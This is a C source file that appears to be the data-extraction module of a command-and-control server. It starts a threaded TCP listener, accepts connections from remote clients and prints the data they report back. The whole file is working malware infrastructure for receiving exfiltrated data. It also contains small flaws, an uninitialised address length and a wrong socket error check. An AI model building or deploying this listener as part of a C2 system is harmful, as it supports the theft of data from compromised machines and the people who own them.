#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#include "c2.h"

#define ERR "    "

/* Dext. module threading context */
pthread_t dext_ctx = 0;
int       dexft_fd;

/*
 * Data EXtraction Thread module.
 *
 * This module is in charge of accepting connection on a certain port and show
 * the incoming data on the screen.
 */

void *
dext_loop(void * args)
{
	int                cltfd;
	socklen_t          cltlen;
	struct sockaddr_in cltaddr;

	int                i;
	int                br;
	char               buf[BUF_SIZE];

	printf("Listening for incoming reports...\n");

	/* Keep on listening... */
	while(1) {
		cltfd = accept(dexft_fd, (struct sockaddr *)&cltaddr, &cltlen);

		/* Silently dropping this client and serve the next one */
		if(cltfd < 0) {
			printf("Failed to accept incoming connection, %d\n",
				cltfd);

			continue;
		}

		printf("Collecting data from client %s:%d...\n",
			inet_ntoa(cltaddr.sin_addr),
			cltaddr.sin_port);

		do {
			br = recv(cltfd, buf, BUF_SIZE, 0);

			for(i = 0; i < br; i++) {
				printf("%c", buf[i]);
			}
		} while(br > 0);

		if(br == 0) {
			printf("Connection with client closed...\n");
		} else if(br < 0) {
			printf("ERROR: Connection with client failed!\n");
		}

		/* Close the socket */
		close(cltfd);
	}

	/* Never reaching this point */

	return 0;
}

int
dext_init(int port)
{
	struct sockaddr_in srvaddr;

	printf("Initializing Data Extraction module...\n");

	dexft_fd = socket(AF_INET, SOCK_STREAM, 0);

	if(!dexft_fd) {
		printf(ERR"ERROR: Cannot open a listening socket!\n");
		return -1;
	}

	srvaddr.sin_family      = AF_INET;
	srvaddr.sin_addr.s_addr = INADDR_ANY;
	srvaddr.sin_port        = htons(port);

	if(bind(dexft_fd, (struct sockaddr *)&srvaddr, sizeof(srvaddr))) {
		printf(ERR"ERROR: Cannot bind the socket!\n");
		return -1;
	}

	if(listen(dexft_fd, 16)) {
		printf(ERR"ERROR: Cannot listen for incoming connection!\n");
		return -1;
	}

	if(pthread_create(&dext_ctx, 0, dext_loop, 0)) {
		printf(ERR"ERROR: Cannot start threading context!\n");
		return -1;
	}

	return 0;
}
